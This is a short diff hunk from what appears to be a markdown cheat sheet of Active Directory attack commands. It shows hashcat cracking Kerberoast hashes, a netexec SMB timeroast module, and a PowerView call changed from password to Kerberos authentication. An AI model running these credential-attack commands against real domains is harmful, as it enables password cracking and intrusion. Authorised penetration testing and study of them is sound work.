@@ -34,7 +34,7 @@ sh -c '[ -s hashes.kerberoast ] && hashcat --runtime 30 hashes.kerberoast /usr/s
 
 nxc smb <ip> -u '<user>' -p '<password>' -M timeroast
 
-powerview <domain>/'<user>:<password>'@<dc_fqdn> --no-cache
+powerview <domain>/'<user>'@<dc_fqdn> -k --no-pass
 ```
 
 ## ad additional user all in one
